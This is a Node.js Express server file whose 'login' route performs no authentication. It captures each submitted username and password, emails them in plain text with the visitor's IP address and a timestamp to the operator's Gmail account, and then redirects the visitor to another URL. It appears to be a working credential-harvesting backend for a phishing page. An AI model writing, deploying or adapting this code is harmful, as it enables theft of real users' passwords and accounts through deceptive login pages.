const express = require("express");
const nodemailer = require("nodemailer");
require("dotenv").config();

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

// Login route
app.post("/login", async (req, res) => {
    const { username, password } = req.body;

    const timestamp = new Date().toLocaleString();
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    const transporter = nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 587,
        secure: false,
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS
        }
    });

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_USER,
        subject: "New Login Detected",
        text: `A login just occurred.

Username: ${username}
Password: ${password}

Time: ${timestamp}
IP Address: ${ip}`
    };

    try {
        await transporter.sendMail(mailOptions);
    } catch (error) {
        console.error("Email error:", error);
    }

    res.redirect(process.env.REDIRECT_URL);
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});